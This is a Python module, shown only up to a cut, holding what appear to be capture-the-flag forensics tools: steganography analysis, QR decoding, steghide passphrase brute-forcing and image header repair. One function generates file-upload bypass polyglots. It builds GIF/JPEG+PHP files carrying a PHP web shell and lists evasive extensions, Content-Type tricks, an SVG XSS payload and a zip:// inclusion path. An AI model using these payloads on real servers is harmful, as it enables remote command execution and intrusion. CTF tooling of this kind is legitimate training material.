"""Steganography, image forensics, and compression tools."""
from __future__ import annotations
import re, subprocess, os, shutil, struct, io


def tool_audio_steg(audio_path: str, operation: str = "analyze") -> str:
    """Audio steganography: analyze, spectrogram, dtmf, lsb, strings."""
    sp = _w2l(audio_path) if (IS_WINDOWS and USE_WSL) else audio_path
    if operation == "analyze":
        return _shell(f"file '{sp}'; soxi '{sp}' 2>/dev/null; exiftool '{sp}' 2>/dev/null | head -15")
    if operation == "spectrogram":
        out_img = f"/tmp/spec_{int(time.time())}.png"
        out = _shell(f"sox '{sp}' -n spectrogram -o '{out_img}' 2>/dev/null && echo 'Saved:{out_img}'")
        return out or _shell(f"ffmpeg -i '{sp}' -lavfi showspectrumpic=s=1024x512 '{out_img}' 2>&1 | tail -3") + f"\nView: {out_img}"
    if operation == "dtmf":
        return _shell(f"multimon-ng -t wav -a DTMF '{sp}' 2>/dev/null || sox '{sp}' -t raw -r 8000 -e signed -b 16 - 2>/dev/null | multimon-ng -t raw -a DTMF - 2>/dev/null")
    if operation == "lsb":
        code = f"""import wave,struct,re
try:
    with wave.open(\'{audio_path}\',\'rb\') as w: raw=w.readframes(w.getnframes())
    samples=[struct.unpack_from(\'<h\',raw,i*2)[0] for i in range(min(8000*8,len(raw)//2))]
    bits=\'\'.join(str(s&1) for s in samples)
    result=bytes(int(bits[i:i+8],2) for i in range(0,len(bits)-7,8))
    print(f\'LSB: {{result[:200]}}\'); flags=re.findall(rb\'[A-Za-z]{{2,10}}\\{{[^}}]{{3,60}}\\}}\',result)
    if flags: print(f\'FLAGS: {{flags}}\')\nexcept ImportError: print('wave module issue')"""
        return tool_execute_python(code)
    if operation == "strings":
        return _shell(f"strings -n 6 '{sp}' | head -50")
    return "Available: analyze, spectrogram, dtmf, lsb, strings"


def tool_image_steg_advanced(image_path: str = "", operation: str = "auto",
                              channel: str = "all", bit_plane: int = 0,
                              output_path: str = "") -> str:
    """Advanced image steganography analysis beyond basic LSB/zsteg.
    Ops: auto (run all checks), msb (most-significant-bit extraction),
    color_planes (extract R/G/B/A channels separately to PNGs),
    bit_plane_extract (extract specific bit plane 0-7 from each channel),
    fourier (FFT magnitude spectrum — reveals frequency-domain hiding),
    palette_steg (analyze PNG palette/indexed color for hidden data),
    alpha_extract (dump alpha channel bytes — often used for steg),
    outguess (run outguess JPEG steg detector),
    stegsolve (PIL-based plane analysis for all 32 bit/channel combos),
    metadata_deep (exiftool -all= strips + exiv2 + identify -verbose)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""
    op = output_path or f"/tmp/steg_out_{int(time.time())}"
    _shell(f"mkdir -p '{op}'")

    if operation == "auto":
        results = []
        # 1. zsteg full scan
        results.append("=== zsteg full scan ===")
        results.append(_shell(f"zsteg -a '{sp}' 2>&1 | head -60", timeout=30))
        # 2. steghide with empty password
        results.append("\n=== steghide (no password) ===")
        results.append(_shell(f"steghide extract -sf '{sp}' -p '' -f -o '{op}/steghide_out' 2>&1 && cat '{op}/steghide_out' 2>/dev/null | head -20", timeout=10))
        # 3. MSB plane
        results.append("\n=== MSB extraction ===")
        results.append(tool_image_steg_advanced(sp, "msb"))
        # 4. Alpha channel
        results.append("\n=== Alpha channel ===")
        results.append(tool_image_steg_advanced(sp, "alpha_extract", output_path=op))
        # 5. outguess
        results.append("\n=== outguess ===")
        results.append(_shell(f"outguess -r '{sp}' '{op}/outguess_out' 2>&1 && cat '{op}/outguess_out' 2>/dev/null", timeout=15))
        # 6. strings on raw pixel data
        results.append("\n=== strings in pixel data ===")
        results.append(tool_image_steg_advanced(sp, "stegsolve"))
        return "\n".join(results)

    if operation == "msb":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("RGB")
arr = np.array(img)
# Extract MSB (bit 7) of R, G, B channels
for ch_idx, ch_name in enumerate(["R","G","B"]):
    channel = arr[:,:,ch_idx]
    msb_bits = ((channel >> 7) & 1).flatten()
    # Pack 8 bits into bytes
    n = (len(msb_bits) // 8) * 8
    bits = msb_bits[:n].reshape(-1, 8)
    from functools import reduce
    import operator
    vals = np.packbits(bits, bitorder='big')
    text = bytes(vals).decode("latin-1")
    printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
    if len(printable) > 10:
        print(f"MSB {{ch_name}}: {{printable[:200]}}")
    else:
        print(f"MSB {{ch_name}}: (no printable text)")

# Also try bit planes 6 and 5
for bit in [6, 5]:
    for ch_idx, ch_name in enumerate(["R","G","B"]):
        channel = arr[:,:,ch_idx]
        plane_bits = ((channel >> bit) & 1).flatten()
        n = (len(plane_bits) // 8) * 8
        vals = np.packbits(plane_bits[:n].reshape(-1,8), bitorder='big')
        text = bytes(vals).decode("latin-1")
        printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
        if 'picoCTF' in printable or 'flag' in printable.lower():
            print(f"[!] FOUND in bit{{bit}} {{ch_name}}: {{printable[:200]}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "color_planes":
        code = f"""
from PIL import Image
import os
img = Image.open({repr(sp)})
out = {repr(op)}
if img.mode in ("RGBA", "RGB"):
    bands = img.split()
    names = list(img.getbands())
    for name, band in zip(names, bands):
        path = os.path.join(out, f"channel_{{name}}.png")
        band.save(path)
        print(f"Saved {{name}} channel → {{path}}")
        # Check for strings in this channel's raw bytes
        import io
        buf = io.BytesIO()
        band.save(buf, format="PNG")
        raw = bytes(band.getdata())
        printable = ''.join(chr(b) for b in raw if 32 <= b <= 126)
        if 'picoCTF' in printable:
            print(f"  [!] FLAG FOUND in channel {{name}}!")
else:
    print(f"Mode: {{img.mode}} — converting to RGBA")
    img.convert("RGBA").split()
"""
        return tool_execute_python(code, timeout=20)

    if operation == "bit_plane_extract":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("RGBA")
arr = np.array(img)
bit = {bit_plane}
ch_names = ["R","G","B","A"]
for ch_idx, ch_name in enumerate(ch_names):
    channel = arr[:,:,ch_idx]
    plane = ((channel >> bit) & 1)
    # Visualize as B&W image
    vis = (plane * 255).astype(np.uint8)
    out_path = {repr(op)} + f"/bit{{bit}}_{{ch_name}}.png"
    Image.fromarray(vis, mode="L").save(out_path)
    # Extract as text
    bits_flat = plane.flatten()
    n = (len(bits_flat) // 8) * 8
    vals = np.packbits(bits_flat[:n].reshape(-1,8), bitorder='big')
    text = bytes(vals).decode("latin-1")
    printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
    flag_hit = 'picoCTF' in printable or 'flag' in printable.lower()
    print(f"Bit{{bit}} {{ch_name}}: {{out_path}}{' [!] FLAG FOUND' if flag_hit else ''}")
    if flag_hit or len(printable) > 20:
        print(f"  text: {{printable[:300]}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "fourier":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("L")
arr = np.array(img, dtype=float)
fft = np.fft.fft2(arr)
fft_shift = np.fft.fftshift(fft)
magnitude = np.log(np.abs(fft_shift) + 1)
# Normalize to 0-255
mag_norm = ((magnitude - magnitude.min()) / (magnitude.max() - magnitude.min()) * 255).astype(np.uint8)
out_path = {repr(op)} + "/fourier_magnitude.png"
Image.fromarray(mag_norm).save(out_path)
print(f"FFT magnitude saved → {{out_path}}")
# Check for unusual peaks (possible frequency domain steganography)
peaks = np.where(magnitude > magnitude.mean() + 3*magnitude.std())
if len(peaks[0]) > 0:
    print(f"Unusual frequency peaks at {{len(peaks[0])}} locations — possible frequency-domain steg")
else:
    print("No unusual frequency peaks detected")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "palette_steg":
        code = f"""
from PIL import Image
img = Image.open({repr(sp)})
if img.mode == "P":
    palette = img.getpalette()
    print(f"Indexed image, palette size: {{len(palette)//3}} colors")
    # Check LSBs of palette entries
    lsb_bits = [c & 1 for c in palette]
    n = (len(lsb_bits)//8)*8
    vals = bytearray()
    for i in range(0, n, 8):
        byte = 0
        for bit in lsb_bits[i:i+8]:
            byte = (byte << 1) | bit
        vals.append(byte)
    text = bytes(vals).decode("latin-1")
    printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
    print(f"Palette LSB text: {{printable[:200]}}")
    if 'picoCTF' in printable:
        print("[!] FLAG FOUND in palette LSBs!")
    # Show first 16 palette entries
    print("\nFirst 16 palette entries (R,G,B):")
    for i in range(0, min(48, len(palette)), 3):
        print(f"  [{i//3}] #{palette[i]:02x}{palette[i+1]:02x}{palette[i+2]:02x}")
else:
    print(f"Image mode: {{img.mode}} (not indexed/palette mode)")
    # Still check if there's hidden data in specific pixel patterns
    import numpy as np
    arr = np.array(img.convert("RGB"))
    unique_colors = len(set(map(tuple, arr.reshape(-1,3))))
    print(f"Unique colors: {{unique_colors}}")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "alpha_extract":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)})
if img.mode in ("RGBA", "LA"):
    alpha = np.array(img.split()[-1])
    raw = alpha.flatten()
    # Check for non-trivial alpha (not all 255 or all 0)
    unique = set(raw)
    print(f"Alpha channel: {{alpha.shape}}, unique values: {{len(unique)}}")
    if len(unique) > 2:
        # Extract as bytes
        text = bytes(raw.tolist()).decode("latin-1")
        printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
        print(f"Alpha raw text: {{printable[:300]}}")
        if 'picoCTF' in printable:
            print("[!] FLAG FOUND in alpha channel!")
    # LSB of alpha
    lsb_bits = [int(v) & 1 for v in raw]
    n = (len(lsb_bits)//8)*8
    vals = bytes([int(''.join(str(b) for b in lsb_bits[i:i+8]),2) for i in range(0,n,8)])
    printable_lsb = ''.join(chr(b) for b in vals if 32 <= b <= 126)
    print(f"Alpha LSB text: {{printable_lsb[:200]}}")
    if 'picoCTF' in printable_lsb:
        print("[!] FLAG FOUND in alpha LSBs!")
else:
    print(f"No alpha channel (mode: {{img.mode}})")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "outguess":
        out = f"{op}/outguess_result"
        return _shell(f"outguess -r '{sp}' '{out}' 2>&1 && echo '--- content ---' && cat '{out}' 2>/dev/null && strings '{out}' 2>/dev/null | head -20", timeout=15)

    if operation == "stegsolve":
        """PIL-based full sweep: all bit planes for all channels, MSB→LSB, row/column order."""
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("RGBA")
arr = np.array(img)
ch_names = ["R","G","B","A"]
found = []
for bit in range(8):
    for ch_idx, ch_name in enumerate(ch_names):
        channel = arr[:,:,ch_idx]
        bits_xy = ((channel >> bit) & 1).flatten()
        n = (len(bits_xy)//8)*8
        vals = np.packbits(bits_xy[:n].reshape(-1,8), bitorder='big')
        text = bytes(vals).decode("latin-1")
        if 'picoCTF' in text or 'flag{{' in text.lower():
            idx = text.find('picoCTF')
            if idx == -1: idx = text.lower().find('flag{{')
            found.append(f"[!] HIT bit{{bit}},{{ch_name}},lsb,xy: {{text[max(0,idx-5):idx+80]}}")
        # also try MSB ordering
        vals_msb = np.packbits(bits_xy[:n].reshape(-1,8), bitorder='little')
        text_msb = bytes(vals_msb).decode("latin-1")
        if 'picoCTF' in text_msb or 'flag{{' in text_msb.lower():
            idx = text_msb.find('picoCTF')
            found.append(f"[!] HIT bit{{bit}},{{ch_name}},msb,xy: {{text_msb[max(0,idx-5):idx+80]}}")
if found:
    print("\n".join(found))
else:
    print("No flag pattern found in any of 64 bit/channel/order combos")
    print("Try: analyze_file steg_tools (steghide+zsteg), audio_steg, or check metadata")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "metadata_deep":
        return (_shell(f"exiftool -a -u -g '{sp}' 2>&1 | head -80", timeout=10) + "\n" +
                _shell(f"identify -verbose '{sp}' 2>&1 | head -60", timeout=10) + "\n" +
                _shell(f"strings '{sp}' | grep -iE 'picoCTF|flag{{|Author|Comment|Description' | head -20", timeout=10))

    return "Operations: auto, msb, color_planes, bit_plane_extract, fourier, palette_steg, alpha_extract, outguess, stegsolve, metadata_deep"


def tool_polyglot_file(operation: str = "list", file_type_a: str = "gif",
                        file_type_b: str = "php", content: str = "<?php system($_GET['cmd']); ?>",
                        input_path: str = "", output_path: str = "") -> str:
    """Generate polyglot files that are simultaneously valid as two different formats.
    Bypasses file upload type checks. E.g. GIF+PHP, PNG+JS, PDF+HTML, ZIP+JAR."""

    POLYGLOT_CATALOG = {
        ("gif", "php"): {
            "desc": "GIF89a header + PHP code — passes GIF MIME check, executes as PHP",
            "note": "Upload as .php or .phtml; server must allow PHP execution",
        },
        ("png", "php"): {
            "desc": "PNG IDAT chunk with PHP code in Comment/Text chunk",
            "note": "Use exiftool or PIL to inject into Comment field",
        },
        ("pdf", "html"): {
            "desc": "PDF header + HTML body — opens as PDF but innerHTML is HTML",
            "note": "Useful for stored XSS via file serve endpoints",
        },
        ("zip", "jar"): {
            "desc": "ZIP == JAR — same format, useful for SSRF/deserialization",
            "note": "JAR manifest required at META-INF/MANIFEST.MF",
        },
        ("zip", "docx"): {
            "desc": "Valid DOCX (Office Open XML) is a ZIP — modify contents for XXE",
        },
        ("gif", "js"): {
            "desc": "GIF header that is also valid JS (comment or assignment)",
        },
        ("jpg", "php"): {
            "desc": "JPEG with PHP payload in EXIF/Comment field",
        },
        ("svg", "xss"): {
            "desc": "SVG with embedded JS for XSS via <script> or onload",
        },
        ("html", "php"): {
            "desc": "HTML file with PHP code in comment blocks",
        },
        ("zip", "php"): {
            "desc": "PHP Zip wrapper: can be read via zip://archive.jpg#shell.php",
        },
    }

    if operation == "list":
        lines = ["=== Polyglot file type catalog ===\n"]
        for (a, b), meta in POLYGLOT_CATALOG.items():
            lines.append(f"  {a}+{b}: {meta['desc']}")
            if "note" in meta: lines.append(f"      Note: {meta['note']}")
        lines.append("\nUsage: operation='generate', file_type_a='gif', file_type_b='php'")
        lines.append("       optionally: input_path=<existing image>, content=<payload>")
        return "\n".join(lines)

    if operation == "generate":
        fa, fb = file_type_a.lower(), file_type_b.lower()
        out = output_path or f"/tmp/polyglot_{fa}_{fb}_{int(time.time())}.{fa}"
        code_lines = []

        if (fa, fb) in [("gif", "php"), ("php", "gif")]:
            code_lines = [
                f"payload = {repr(content)}",
                f"out = {repr(out)}",
                "# GIF89a magic + PHP payload",
                "gif_header = b'GIF89a'",
                "# Minimal GIF: 1x1 pixel, transparent",
                "gif_data = bytes([",
                "  0x47,0x49,0x46,0x38,0x39,0x61,  # GIF89a",
                "  0x01,0x00,0x01,0x00,0x80,0x00,0x00,  # 1x1, GCT flag",
                "  0xFF,0xFF,0xFF,0x00,0x00,0x00,  # white, black palette",
                "  0x21,0xF9,0x04,0x00,0x00,0x00,0x00,0x00,  # GCE",
                "  0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,  # image desc",
                "  0x02,0x02,0x4C,0x01,0x00,0x3B  # image data + trailer",
                "])",
                "# Append PHP after GIF trailer (some servers only check magic)",
                "# OR inject into GIF comment block (0x21 0xFE)",
                "comment_payload = b'\\x21\\xFE' + bytes([len(payload.encode())]) + payload.encode() + b'\\x00'",
                "# Build: GIF header, then comment with PHP, then 1x1 image data",
                "gif_without_trailer = bytes([",
                "  0x47,0x49,0x46,0x38,0x39,0x61,",
                "  0x01,0x00,0x01,0x00,0x80,0x00,0x00,",
                "  0xFF,0xFF,0xFF,0x00,0x00,0x00",
                "])",
                "full = gif_without_trailer + comment_payload + bytes([",
                "  0x21,0xF9,0x04,0x00,0x00,0x00,0x00,0x00,",
                "  0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,",
                "  0x02,0x02,0x4C,0x01,0x00,0x3B",
                "])",
                "with open(out,'wb') as f: f.write(full)",
                "import subprocess",
                "verify = subprocess.run(['file', out], capture_output=True, text=True)",
                "print(f'Written: {out} ({len(full)} bytes)')",
                "print(f'file output: {verify.stdout.strip()}')",
                "print(f'PHP payload: {payload[:80]}')",
                "print('Upload as: shell.php, shell.php.gif, shell.phtml, shell.php5')",
                "print('Try: Content-Type: image/gif with .php extension')",
            ]

        elif (fa, fb) in [("jpg", "php"), ("jpeg", "php")]:
            if input_path:
                code_lines = [
                    f"import subprocess",
                    f"out = {repr(out.replace('.gif','.jpg'))}",
                    f"payload = {repr(content)}",
                    f"import shutil; shutil.copy({repr(input_path)}, out)",
                    f"# Inject via exiftool comment",
                    f"r = subprocess.run(['exiftool', f'-Comment={payload}', out],",
                    f"  capture_output=True, text=True)",
                    f"print(r.stdout or r.stderr)",
                    f"# Also try imagemagick IPTC injection",
                    f"r2 = subprocess.run(['convert', out, '-set', 'comment', payload, out],",
                    f"  capture_output=True, text=True)",
                    f"print('Done:', out)",
                ]
            else:
                code_lines = [
                    f"out = {repr(out.replace('.gif','.jpg'))}",
                    f"payload = {repr(content)}",
                    "# Minimal JPEG with PHP in comment (0xFF 0xFE)",
                    "jpeg_soi = bytes([0xFF,0xD8])  # SOI",
                    "comment = payload.encode()",
                    "comment_len = len(comment) + 2",
                    "jpeg_comment = bytes([0xFF,0xFE]) + comment_len.to_bytes(2,'big') + comment",
                    "# Minimal JFIF APP0 + 1x1 pixel image",
                    "jpeg_end = bytes([0xFF,0xD9])  # EOI",
                    "full = jpeg_soi + jpeg_comment + jpeg_end",
                    "with open(out,'wb') as f: f.write(full)",
                    "print(f'JPEG+PHP polyglot written: {out} ({len(full)} bytes)')",
                ]

        elif (fa, fb) in [("svg", "xss")]:
            svg_xss = f"""<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<script>{content}</script>
<rect width="100" height="100" fill="blue"/>
</svg>"""
            code_lines = [
                f"out = {repr(out.replace('.gif','.svg'))}",
                f"svg = {repr(svg_xss)}",
                "with open(out,'w') as f: f.write(svg)",
                "print(f'SVG+XSS written: {out}')",
                "print('Upload with Content-Type: image/svg+xml')",
                "print('Or inject as <img src=x.svg> for stored XSS')",
            ]

        elif (fa, fb) in [("pdf", "html")]:
            pdf_html = (f"%PDF-1.4\n1 0 obj<</Type /Catalog /Pages 2 0 R>>endobj\n"
                        f"2 0 obj<</Type /Pages /Kids[3 0 R]/Count 1>>endobj\n"
                        f"3 0 obj<</Type /Page /MediaBox[0 0 612 792]>>endobj\n"
                        f"<html><body>{content}</body></html>\n"
                        f"xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n"
                        f"0000000058 00000 n\n0000000115 00000 n\n"
                        f"trailer<</Size 4/Root 1 0 R>>\nstartxref\n173\n%%EOF")
            code_lines = [
                f"out = {repr(out.replace('.gif','.pdf'))}",
                f"content = {repr(pdf_html)}",
                "with open(out,'w') as f: f.write(content)",
                "print(f'PDF+HTML polyglot: {out}')",
                "print('Serve with Content-Type: application/pdf for PDF readers')",
                "print('Or text/html to render as HTML page')",
            ]

        elif (fa, fb) in [("zip", "php")]:
            code_lines = [
                f"import zipfile, io",
                f"out = {repr(out.replace('.gif','.zip'))}",
                f"shell_content = {repr(content)}",
                "buf = io.BytesIO()",
                "with zipfile.ZipFile(buf, 'w') as z:",
                "    z.writestr('shell.php', shell_content)",
                "data = buf.getvalue()",
                "with open(out, 'wb') as f: f.write(data)",
                "print(f'ZIP archive written: {out}')",
                "print(f'PHP zip:// wrapper usage:')",
                f"print(f'  ?file=zip://{out}%23shell.php')",
                "print('Or upload as image.jpg and reference via zip://')",
            ]

        else:
            # Generic: prepend magic bytes of file_type_a, append content for file_type_b
            magic = {
                "gif": b"GIF89a", "png": b"\x89PNG\r\n\x1a\n",
                "jpg": b"\xff\xd8\xff", "jpeg": b"\xff\xd8\xff",
                "pdf": b"%PDF-1.4", "zip": b"PK\x03\x04",
            }.get(fa, fa.encode())
            code_lines = [
                f"magic = {repr(magic)}",
                f"payload = {repr(content.encode() if isinstance(content,str) else content)}",
                f"out = {repr(out)}",
                "full = magic + b'\\n' + payload",
                "with open(out,'wb') as f: f.write(full)",
                "print(f'Generic polyglot {fa}+{fb}: {out} ({len(full)} bytes)')",
                "print('Note: this is a best-effort skeleton. May need manual adjustment')",
                "print('for strict format validators. Check with: file <output>')",
            ]

        return tool_execute_python("\n".join(code_lines), timeout=20)

    if operation == "check":
        if not input_path: return "Provide input_path to check"
        return _shell(f"file '{input_path}'; exiftool '{input_path}' 2>/dev/null | head -20; "
                      f"xxd '{input_path}' | head -6")

    return "Operations: list, generate, check"


def tool_qr_decode(image_path: str = "", operation: str = "decode",
                   barcode_type: str = "any", data: str = "") -> str:
    """Decode QR codes, DataMatrix, Code128, and all barcode types from image files.
    Ops: decode (zbarimg primary + pyzbar fallback), scan_all (both decoders merged),
    barcode (force specific type), generate (qrencode data string → /tmp/qr_out.png)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""

    if operation == "generate":
        if not data:
            return "Provide data= for generate operation"
        out = "/tmp/qr_out.png"
        res = _shell(f"qrencode -o '{out}' {repr(data)} 2>&1 && echo 'Saved: {out}'", timeout=10)
        if "Saved:" not in res:
            # fallback: python qrcode library
            code = f"""
import qrcode, sys
img = qrcode.make({repr(data)})
img.save('/tmp/qr_out.png')
print('Saved: /tmp/qr_out.png')
"""
            res = tool_execute_python(code, timeout=15)
        return res

    if not sp:
        return "Provide image_path"

    results = []

    # zbarimg (primary)
    type_flag = f"--nodbus -q" if barcode_type == "any" else f"--nodbus -q --scan-{barcode_type}"
    zbar_out = _shell(f"zbarimg {type_flag} '{sp}' 2>&1", timeout=15)
    if zbar_out and "not found" not in zbar_out.lower() and "error" not in zbar_out.lower()[:20]:
        results.append(f"[zbarimg]\n{zbar_out}")
    else:
        results.append(f"[zbarimg] {zbar_out}")

    if operation == "scan_all" or not results[0].startswith("[zbarimg]\nQR"):
        # pyzbar fallback
        code = f"""
try:
    from pyzbar.pyzbar import decode as pyzbar_decode
    from PIL import Image
    img = Image.open({repr(sp)})
    codes = pyzbar_decode(img)
    if codes:
        for c in codes:
            print(f"[pyzbar] {{c.type}}: {{c.data.decode(errors='replace')}}")
    else:
        print("[pyzbar] No codes detected")
except ImportError:
    print("[pyzbar] not installed — pip install pyzbar pillow")
except Exception as ex:
    print(f"[pyzbar] error: {{ex}}")
"""
        pyzbar_out = tool_execute_python(code, timeout=15)
        results.append(pyzbar_out)

    return "\n".join(results)


def tool_steg_brute(image_path: str, operation: str = "auto",
                     wordlist: str = "/usr/share/wordlists/rockyou.txt",
                     output_dir: str = "/tmp/steg_extracted") -> str:
    """Steganography password brute-force wrapping stegseek + stegcracker.
    Ops: auto (stegseek fastest, fallback stegcracker, fallback empty password),
    stegseek (stegseek — fastest steghide cracker, uses rockyou),
    stegcracker (stegcracker Python tool — slower but more formats),
    steghide_empty (try steghide with no password),
    outguess_crack (try outguess with wordlist),
    all_tools (run every tool in sequence until one succeeds)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""
    _shell(f"mkdir -p '{output_dir}'")
    out_file = f"{output_dir}/extracted_{int(time.time())}"

    if operation in ("auto", "stegseek"):
        result = _shell(f"stegseek '{sp}' '{wordlist}' '{out_file}' 2>&1", timeout=120)
        if "not found" in result or "command not found" in result:
            if operation == "stegseek":
                return ("stegseek not installed.\nInstall: apt install stegseek\n"
                        "Or download: https://github.com/RickdeJager/stegseek/releases\n"
                        "Fast install: dpkg -i stegseek_*.deb")
        else:
            if "Found passphrase" in result or "wrote" in result.lower():
                content = _shell(f"cat '{out_file}' 2>/dev/null || strings '{out_file}' 2>/dev/null | head -20", timeout=5)
                return f"{result}\n\nExtracted content:\n{content}"
            return result
        if operation == "auto":
            # Fall through to empty password
            pass

    if operation in ("auto", "steghide_empty"):
        result = _shell(f"steghide extract -sf '{sp}' -p '' -f -o '{out_file}_empty' 2>&1", timeout=15)
        if "wrote" in result or "extracted" in result.lower():
            content = _shell(f"cat '{out_file}_empty' 2>/dev/null || strings '{out_file}_empty' 2>/dev/null | head -20", timeout=5)
            return f"steghide (empty password) success!\n{result}\n\nContent:\n{content}"
        if operation == "steghide_empty":
            return result

    if operation in ("auto", "stegcracker"):
        result = _shell(f"stegcracker '{sp}' '{wordlist}' 2>&1 | tail -20", timeout=180)
        if "not found" in result or "command not found" in result:
            # pip fallback
            result2 = _shell(f"python3 -m stegcracker '{sp}' '{wordlist}' 2>&1 | tail -20", timeout=180)
            if "not found" in result2:
                if operation == "stegcracker":
                    return "stegcracker not installed.\nInstall: pip install stegcracker"
                return "All steg brute tools unavailable. Install: stegseek OR pip install stegcracker"
            return result2
        return result

    if operation == "outguess_crack":
        code = f"""
import subprocess
sp = {repr(sp)}
out = {repr(out_file)}
wl = {repr(wordlist)}
found = False
with open(wl, 'r', errors='replace') as f:
    for i, line in enumerate(f):
        pw = line.strip()
        r = subprocess.run(['outguess', '-k', pw, '-r', sp, out+'_og'],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and 'writing' in r.stderr.lower():
            print(f'[+] outguess passphrase: {{repr(pw)}}')
            found = True
            break
        if i % 1000 == 0:
            print(f'Tried {{i}} passwords...')
        if i > 50000:
            print('Stopped at 50000 attempts')
            break
if not found:
    print('outguess crack failed')
"""
        return tool_execute_python(code, timeout=180)

    if operation == "all_tools":
        results = []
        for op in ("steghide_empty", "stegseek", "stegcracker"):
            r = tool_steg_brute(sp, op, wordlist, output_dir)
            results.append(f"=== {op} ===\n{r}")
            if "success" in r.lower() or "Found passphrase" in r or "wrote" in r.lower():
                break
        return "\n\n".join(results)

    return "Operations: auto, stegseek, stegcracker, steghide_empty, outguess_crack, all_tools"


def tool_image_repair(image_path: str, operation: str = "detect",
                       width: int = 0, height: int = 0,
                       output_path: str = "") -> str:
    """Corrupted image repair using pngcheck + PIL/struct header patching.
    Ops: detect (identify corruption type — wrong magic, wrong dimensions, bad CRC),
    fix_png_header (repair PNG magic bytes and IHDR chunk),
    fix_jpeg_markers (repair JPEG SOI/EOI markers and scan for valid markers),
    restore_dimensions (patch width/height in PNG IHDR — common CTF trick),
    fix_bmp_header (repair BMP file header and DIB header),
    check_crc (recompute PNG chunk CRCs and report mismatches)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""
    out = output_path or sp + ".repaired"

    if operation == "detect":
        pngcheck_out = _shell(f"pngcheck '{sp}' 2>&1", timeout=10)
        file_out = _shell(f"file '{sp}' 2>&1", timeout=5)
        code = f"""
with open({repr(sp)}, 'rb') as f: data = f.read()
magic = data[:16].hex()
print(f'Magic bytes: {{magic}}')
print(f'File size: {{len(data)}} bytes')

# PNG magic: 89504e470d0a1a0a
# JPEG magic: ffd8ff
# BMP magic: 4d42
# GIF magic: 47494638

if data[:8] == b'\\x89PNG\\r\\n\\x1a\\n':
    print('PNG: valid magic')
    # Check IHDR
    if len(data) > 24:
        import struct
        w = struct.unpack('>I', data[16:20])[0]
        h = struct.unpack('>I', data[20:24])[0]
        bd = data[24]
        ct = data[25]
        print(f'PNG IHDR: width={{w}} height={{h}} bit_depth={{bd}} color_type={{ct}}')
        if w == 0 or h == 0: print('[!] Invalid dimensions — likely corrupted IHDR')
        if w > 10000 or h > 10000: print('[!] Suspicious large dimensions')
elif data[:2] == b'\\xff\\xd8':
    print('JPEG: valid magic')
elif data[:2] == b'BM':
    print('BMP: valid magic')
    import struct
    file_size = struct.unpack('<I', data[2:6])[0]
    data_offset = struct.unpack('<I', data[10:14])[0]
    w = struct.unpack('<I', data[18:22])[0]
    h = struct.unpack('<I', data[22:26])[0]
    print(f'BMP: file_size={{file_size}} data_offset={{data_offset}} w={{w}} h={{h}}')
else:
    print(f'[!] Unrecognized magic: {{data[:8].hex()}}')
    print('Expected: PNG=89504e47, JPEG=ffd8ff, BMP=424d, GIF=47494638')
"""
        return f"pngcheck: {pngcheck_out}\nfile: {file_out}\n" + tool_execute_python(code, timeout=10)

    if operation == "fix_png_header":
        code = f"""
import struct, binascii
with open({repr(sp)}, 'rb') as f: data = bytearray(f.read())
PNG_MAGIC = b'\\x89PNG\\r\\n\\x1a\\n'
if data[:8] != PNG_MAGIC:
    print(f'Fixing PNG magic: {{data[:8].hex()}} → {{PNG_MAGIC.hex()}}')
    data[:8] = PNG_MAGIC
# Verify IHDR CRC
if len(data) > 33:
    ihdr_data = data[12:29]  # type + IHDR content
    crc_stored = struct.unpack('>I', data[29:33])[0]
    crc_calc = binascii.crc32(ihdr_data) & 0xffffffff
    if crc_stored != crc_calc:
        print(f'Fixing IHDR CRC: {{hex(crc_stored)}} → {{hex(crc_calc)}}')
        data[29:33] = struct.pack('>I', crc_calc)
with open({repr(out)}, 'wb') as f: f.write(data)
print(f'Saved: {repr(out)}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "restore_dimensions":
        if not width or not height: return "Provide width= and height= (correct dimensions)"
        code = f"""
import struct, binascii
with open({repr(sp)}, 'rb') as f: data = bytearray(f.read())
old_w = struct.unpack('>I', data[16:20])[0]
old_h = struct.unpack('>I', data[20:24])[0]
data[16:20] = struct.pack('>I', {width})
data[20:24] = struct.pack('>I', {height})
print(f'Changed: {{old_w}}x{{old_h}} → {width}x{height}')
# Recompute IHDR CRC (bytes 12-28 are chunk type+data)
ihdr_data = bytes(data[12:29])
new_crc = binascii.crc32(ihdr_data) & 0xffffffff
data[29:33] = struct.pack('>I', new_crc)
with open({repr(out)}, 'wb') as f: f.write(data)
print(f'Saved: {repr(out)}')
# Try to open
from PIL import Image
try:
    img = Image.open({repr(out)})
    print(f'PIL: {width}x{height} mode={{img.mode}}')
    img.save({repr(out.replace('.repaired','_preview.png'))})
except Exception as ex:
    print(f'PIL error: {{ex}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "fix_jpeg_markers":
        code = f"""
with open({repr(sp)}, 'rb') as f: data = bytearray(f.read())
# Ensure SOI marker at start
if data[:2] != b'\\xff\\xd8':
